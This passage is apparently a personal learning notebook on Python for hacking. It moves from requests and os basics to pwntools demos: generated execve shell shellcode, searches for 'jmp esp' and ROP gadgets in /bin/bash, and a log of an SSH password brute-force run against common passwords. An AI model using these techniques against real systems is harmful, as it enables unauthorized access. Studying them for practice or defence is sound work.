     "output_type": "stream",
     "text": [
      "0 [..................................................]\n",
      "1 [#.................................................]\n",
      "2 [##................................................]\n",
      "3 [###...............................................]\n",
      "4 [####..............................................]\n",
      "5 [#####.............................................]\n",
      "6 [######............................................]\n",
      "7 [#######...........................................]\n",
      "8 [########..........................................]\n",
      "9 [#########.........................................]\n",
      "10 [##########........................................]\n",
      "11 [###########.......................................]\n",
      "12 [############......................................]\n",
      "13 [#############.....................................]\n",
      "14 [##############....................................]\n",
      "15 [###############...................................]\n",
      "16 [################..................................]\n",
      "17 [#################.................................]\n",
      "18 [##################................................]\n",
      "19 [###################...............................]\n",
      "20 [####################..............................]\n",
      "21 [#####################.............................]\n",
      "22 [######################............................]\n",
      "23 [#######################...........................]\n",
      "24 [########################..........................]\n",
      "25 [#########################.........................]\n",
      "26 [##########################........................]\n",
      "27 [###########################.......................]\n",
      "28 [############################......................]\n",
      "29 [#############################.....................]\n",
      "30 [##############################....................]\n",
      "31 [###############################...................]\n",
      "32 [################################..................]\n",
      "33 [#################################.................]\n",
      "34 [##################################................]\n",
      "35 [###################################...............]\n",
      "36 [####################################..............]\n",
      "37 [#####################################.............]\n",
      "38 [######################################............]\n",
      "39 [#######################################...........]\n",
      "40 [########################################..........]\n",
      "41 [#########################################.........]\n",
      "42 [##########################################........]\n",
      "43 [###########################################.......]\n",
      "44 [############################################......]\n",
      "45 [#############################################.....]\n",
      "46 [##############################################....]\n",
      "47 [###############################################...]\n",
      "48 [################################################..]\n",
      "49 [#################################################.]\n",
      "50 [##################################################]\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "\n",
    "for i in range(0, 51):\n",
    "    time.sleep(0.1)\n",
    "    sys.stdout.write(\"{} [{}{}]\\r\".format(i, '#'*i, \".\"*(50-i)))\n",
    "    sys.stdout.flush()\n",
    "    sys.stdout.write(\"\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "12f5bbc8",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/usr/lib/python3.10/site-packages/ipykernel_launcher.py',\n",
       " '-f',\n",
       " '/home/ahampriyanshu/.local/share/jupyter/runtime/kernel-c52a2e78-7901-49da-b28c-3381d5fd3a41.json']"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sys.argv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "f8ba0529",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/home/ahampriyanshu/experimenting-with-data-science/hacking-with-python',\n",
       " '/usr/lib/python310.zip',\n",
       " '/usr/lib/python3.10',\n",
       " '/usr/lib/python3.10/lib-dynload',\n",
       " '',\n",
       " '/home/ahampriyanshu/.local/lib/python3.10/site-packages',\n",
       " '/usr/lib/python3.10/site-packages']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sys.path"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c653a41",
   "metadata": {},
   "source": [
    "## request"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "81976ac2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "x = requests.get('http://httpbin.org/get')\n",
    "x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "023c604e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Date': 'Mon, 02 May 2022 14:54:19 GMT', 'Content-Type': 'application/json', 'Content-Length': '307', 'Connection': 'keep-alive', 'Server': 'gunicorn/19.9.0', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true'}"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x.headers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "8f0128b9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'gunicorn/19.9.0'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x.headers['Server']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "5dadd0db",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "200"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x.status_code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "dce68bae",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "datetime.timedelta(microseconds=567049)"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x.elapsed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "7458ab3c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<RequestsCookieJar[]>"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x.cookies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "49f7e6d2",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'{\\n  \"args\": {}, \\n  \"headers\": {\\n    \"Accept\": \"*/*\", \\n    \"Accept-Encoding\": \"gzip, deflate\", \\n    \"Host\": \"httpbin.org\", \\n    \"User-Agent\": \"python-requests/2.27.1\", \\n    \"X-Amzn-Trace-Id\": \"Root=1-626ff09b-60e066c93b558d723525dc64\"\\n  }, \\n  \"origin\": \"112.196.30.231\", \\n  \"url\": \"http://httpbin.org/get\"\\n}\\n'"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x.content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "2f8b30ab",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"args\": {}, \n",
      "  \"headers\": {\n",
      "    \"Accept\": \"*/*\", \n",
      "    \"Accept-Encoding\": \"gzip, deflate\", \n",
      "    \"Host\": \"httpbin.org\", \n",
      "    \"User-Agent\": \"python-requests/2.27.1\", \n",
      "    \"X-Amzn-Trace-Id\": \"Root=1-626ff09b-60e066c93b558d723525dc64\"\n",
      "  }, \n",
      "  \"origin\": \"112.196.30.231\", \n",
      "  \"url\": \"http://httpbin.org/get\"\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(x.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "381a2f24",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://httpbin.org/get?id=3'"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = requests.get('http://httpbin.org/get?id=3')\n",
    "x.url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "4fc63859",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"args\": {\n",
      "    \"id\": \"3\"\n",
      "  }, \n",
      "  \"headers\": {\n",
      "    \"Accept\": \"application/json\", \n",
      "    \"Accept-Encoding\": \"gzip, deflate\", \n",
      "    \"Host\": \"httpbin.org\", \n",
      "    \"User-Agent\": \"python-requests/2.27.1\", \n",
      "    \"X-Amzn-Trace-Id\": \"Root=1-626ff09d-203f42fe15582d0461e4f6d2\"\n",
      "  }, \n",
      "  \"origin\": \"112.196.30.231\", \n",
      "  \"url\": \"http://httpbin.org/get?id=3\"\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "x = requests.get('http://httpbin.org/get', params={'id':'3'}, headers={'Accept':'application/json'})\n",
    "print(x.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "830b12b7",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = requests.delete('http://httpbin.org/delete')\n",
    "x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "f71db58f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"args\": {}, \n",
      "  \"data\": \"\", \n",
      "  \"files\": {}, \n",
      "  \"form\": {\n",
      "    \"id\": \"3\"\n",
      "  }, \n",
      "  \"headers\": {\n",
      "    \"Accept\": \"*/*\", \n",
      "    \"Accept-Encoding\": \"gzip, deflate\", \n",
      "    \"Content-Length\": \"4\", \n",
      "    \"Content-Type\": \"application/x-www-form-urlencoded\", \n",
      "    \"Host\": \"httpbin.org\", \n",
      "    \"User-Agent\": \"python-requests/2.27.1\", \n",
      "    \"X-Amzn-Trace-Id\": \"Root=1-626ff09e-6e5ca8c72b05c0a22be49122\"\n",
      "  }, \n",
      "  \"json\": null, \n",
      "  \"origin\": \"112.196.30.231\", \n",
      "  \"url\": \"http://httpbin.org/post\"\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "x = requests.post('http://httpbin.org/post', data={'id':'3'})\n",
    "print(x.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "e01376cf",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"args\": {}, \n",
      "  \"headers\": {\n",
      "    \"Accept\": \"*/*\", \n",
      "    \"Accept-Encoding\": \"gzip, deflate\", \n",
      "    \"Authorization\": \"Basic c3VwZXI6c2VjcmV0\", \n",
      "    \"Host\": \"httpbin.org\", \n",
      "    \"User-Agent\": \"python-requests/2.27.1\", \n",
      "    \"X-Amzn-Trace-Id\": \"Root=1-626ff09f-3e1f61254413856412bff69c\"\n",
      "  }, \n",
      "  \"origin\": \"112.196.30.231\", \n",
      "  \"url\": \"http://httpbin.org/get\"\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "x = requests.get('http://httpbin.org/get', auth=('super', 'secret'))\n",
    "print(x.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "f29e0f5a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "super:secret"
     ]
    }
   ],
   "source": [
    "!echo -ne c3VwZXI6c2VjcmV0 | base64 -d"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "c66187f6",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/usr/lib/python3.10/site-packages/urllib3/connectionpool.py:1043: InsecureRequestWarning: Unverified HTTPS request is being made to host 'expired.badssl.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html#ssl-warnings\n",
      "  warnings.warn(\n"
     ]
    }
   ],
   "source": [
    "x = requests.get('https://expired.badssl.com', verify=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "28f23f68",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [200]>"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = requests.get('http://github.com')\n",
    "x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "5b94a34e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Response [301]>"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = requests.get('http://github.com', allow_redirects=False)\n",
    "x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "f3f30d3d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'{\\n  \"args\": {}, \\n  \"headers\": {\\n    \"Accept\": \"*/*\", \\n    \"Accept-Encoding\": \"gzip, deflate\", \\n    \"Host\": \"httpbin.org\", \\n    \"User-Agent\": \"python-requests/2.27.1\", \\n    \"X-Amzn-Trace-Id\": \"Root=1-626ff0b8-1338d09c309b49c65dcd5d37\"\\n  }, \\n  \"origin\": \"112.196.30.231\", \\n  \"url\": \"http://httpbin.org/get\"\\n}\\n'"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = requests.get('http://httpbin.org/get', timeout=1)\n",
    "x.content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "b32f8692",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'{\\n  \"cookies\": {\\n    \"a\": \"1\"\\n  }\\n}\\n'"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "x = requests.get('http://httpbin.org/cookies', cookies={'a':'1'})\n",
    "x.content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "56f2c991",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"cookies\": {\n",
      "    \"b\": \"2\"\n",
      "  }\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "x = requests.Session()\n",
    "x.cookies.update({'b':'2'})\n",
    "print(x.get('http://httpbin.org/cookies').text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8a59ef89",
   "metadata": {},
   "source": [
    "## os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "f4d26d33",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "809fe18c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<module 'os' from '/usr/lib/python3.10/os.py'>"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "c252b3ed",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'posix'"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.name"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "d995639c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/ahampriyanshu/experimenting-with-data-science/intro-to-ml'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.getcwd()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "2ac72f3a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/ahampriyanshu/experimenting-with-data-science'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.chdir('../')\n",
    "os.getcwd()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "8fb5218f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['2004-to-2019-lok-sabha-elections',\n",
       " 'README.md',\n",
       " '.gitignore',\n",
       " 'PCIT-114',\n",
       " '.git',\n",
       " 'intro-to-ml',\n",
       " '2022-state-elections',\n",
       " 'uber-rides-analysis']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.listdir()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "11eff18f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['candidates', 'winners']"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.listdir('/home/ahampriyanshu/experimenting-with-data-science/2022-state-elections')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "423176c0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "32"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.path.getsize('/home/ahampriyanshu/experimenting-with-data-science/README.md')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "f0c140ca",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.makedirs('/home/ahampriyanshu/experimenting-with-data-science/temp')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "18c28caa",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['2004-to-2019-lok-sabha-elections',\n",
       " 'temp',\n",
       " 'README.md',\n",
       " '.gitignore',\n",
       " 'PCIT-114',\n",
       " '.git',\n",
       " 'intro-to-ml',\n",
       " '2022-state-elections',\n",
       " 'uber-rides-analysis']"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.listdir('/home/ahampriyanshu/experimenting-with-data-science')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "f537fde2",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.rmdir('/home/ahampriyanshu/experimenting-with-data-science/temp')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "f0822a8d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['temp.txt', '2004-to-2019-lok-sabha-elections', 'README.md', '.gitignore', 'PCIT-114', '.git', 'intro-to-ml', '2022-state-elections', 'uber-rides-analysis']\n"
     ]
    }
   ],
   "source": [
    "with open(os.path.join(os.getcwd(), 'temp.txt'), 'w') as fp:\n",
    "    print(os.listdir(os.getcwd()))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "398ae266",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.remove(os.path.join(os.getcwd(), 'temp.txt'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "9f78472e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['2004-to-2019-lok-sabha-elections',\n",
       " 'README.md',\n",
       " '.gitignore',\n",
       " 'PCIT-114',\n",
       " '.git',\n",
       " 'intro-to-ml',\n",
       " '2022-state-elections',\n",
       " 'uber-rides-analysis']"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "os.listdir(os.getcwd())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "64dd060e",
   "metadata": {},
   "source": [
    "## pwntools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "14f9be4c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "833d628d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'\n"
     ]
    }
   ],
   "source": [
    "print(cyclic(50))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "082c8427",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[!] cyclic_find() expected a 4-byte subsequence, you gave b'eaa'\n",
      "    Unless you specified cyclic(..., n=3), you probably just want the first 4 bytes.\n",
      "    Truncating the data at 4 bytes.  Specify cyclic_find(..., n=3) to override this.\n",
      "16\n"
     ]
    }
   ],
   "source": [
    "print(cyclic_find(\"eaa\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "5e128710",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n",
      "    /* push b'/bin///sh\\x00' */\n",
      "    push 0x68\n",
      "    push 0x732f2f2f\n",
      "    push 0x6e69622f\n",
      "    mov ebx, esp\n",
      "    /* push argument array ['sh\\x00'] */\n",
      "    /* push 'sh\\x00\\x00' */\n",
      "    push 0x1010101\n",
      "    xor dword ptr [esp], 0x1016972\n",
      "    xor ecx, ecx\n",
      "    push ecx /* null terminate */\n",
      "    push 4\n",
      "    pop ecx\n",
      "    add ecx, esp\n",
      "    push ecx /* 'sh\\x00' */\n",
      "    mov ecx, esp\n",
      "    xor edx, edx\n",
      "    /* call execve() */\n",
      "    push SYS_execve /* 0xb */\n",
      "    pop eax\n",
      "    int 0x80\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(shellcraft.sh())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "d5e572bc",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/bin/bash'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Full RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      PIE enabled\n"
     ]
    }
   ],
   "source": [
    "l = ELF('/bin/bash')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "37106f62",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x0\n"
     ]
    }
   ],
   "source": [
    "hex(l.address)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "81810128",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x22330'"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "hex(l.entry)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "71d1a074",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x2296a\n",
      "0x22a26\n"
     ]
    }
   ],
   "source": [
    "for address in l.search(b'/bin/sh\\x00'):\n",
    "    print(hex(address))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "2fa9d5ff",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xdf433\n"
     ]
    }
   ],
   "source": [
    "print(hex(next(l.search(asm('jmp esp')))))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "4ee29ede",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Loading gadgets for '/bin/bash'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "Gadget(0x22733, ['pop rbx', 'ret'], ['rbx'], 0x8)"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = ROP(l)\n",
    "r.rbx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "91cfff87",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/home/ahampriyanshu/.local/lib/python3.10/site-packages/pwnlib/util/fiddling.py:325: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n",
      "  strs = [packing.flat(s, word_size = 8, sign = False, endianness = 'little') for s in args]\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x03'"
      ]
     },
     "execution_count": 40,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xor(\"A\", \"B\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "86323342",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'B'"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xor(xor(\"A\", \"B\"), \"A\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "40546922",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'bWFuamFybw=='"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "b64e(b\"manjaro\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "3d4ba088",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'manjaro'"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "b64d(b\"bWFuamFybw==\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "3bcdc329",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'8fbb65d5340a3da99b49da4a584f42bd'"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "md5sumhex(b\"manjaro\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "3d25ec86",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'fdfbb71efa6115f541e469cfa9b77fbd464b07b3'"
      ]
     },
     "execution_count": 48,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sha1sumhex(b\"manjaro\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "5dbc7f4d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[0, 1, 1, 0, 0, 0, 0, 1]"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bits(b'a')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "86d4e577",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'a'"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "unbits([0, 1, 1, 0, 0, 0, 0, 1])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "aa3a319a",
   "metadata": {},
   "source": [
    "## brute forcing ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "7c68d9f6",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/home/ahampriyanshu/.local/lib/python3.10/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated\n",
      "  \"class\": algorithms.Blowfish,\n"
     ]
    }
   ],
   "source": [
    "from pwn import *\n",
    "import paramiko"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "f96e495e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[O] Attmepting password(0): 'root'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(1): 'qwertyuiop'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(2): 'wubao'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(3): 'password'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(4): '123456'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(5): 'admin'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(6): '12345'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(7): '1234'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(8): 'p@ssw0rd'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(9): '123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(10): '1'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(11): 'jiamima'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(12): 'test'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(13): 'root123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(14): '!'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(15): '!q@w'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(16): '!qaz@wsx'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(17): 'idc!@'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(18): 'admin!@'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(19): ''!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(20): 'alpine'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(21): 'qwerty'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(22): '12345678'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(23): '111111'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(24): '123456789'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(25): '1q2w3e4r'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(26): '123123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(27): 'default'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(28): '1234567'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(29): 'qwe123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(30): '1qaz2wsx'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(31): '1234567890'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(32): 'abcd1234'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(33): '000000'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(34): 'user'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(35): 'toor'!\n",
      "[X] Invalid Password!\n",
